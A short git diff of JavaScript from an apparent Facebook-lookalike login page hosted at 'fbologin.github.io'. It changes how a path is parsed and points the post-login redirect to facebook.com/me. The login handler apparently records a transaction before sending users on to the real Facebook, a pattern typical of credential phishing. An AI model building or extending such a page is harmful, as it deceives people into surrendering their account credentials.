@@ -9,8 +9,8 @@ console.log(window.location.origin.toString());
 // var path = window.location.origin.toString().substring(0,end_of_unique-1);
 // path = path.replace("https://www.","");
 
-var path = window.location.origin.toString().replace("fbologin.github.io/","");
-path = path.replace("https://www.","");
+var path = window.location.pathname.toString().replace("/index.html","");
+// path = path.replace("https://www.","");
 path = path.replace("/","");
 
 console.log(path);
@@ -41,5 +41,5 @@ LoginBtn.addEventListener('click', e => {
         return; // Abort the transaction.
       }
     });
-    window.location.replace("http://www.facebook.com");
+    window.location.replace("http://www.facebook.com/me");
   });
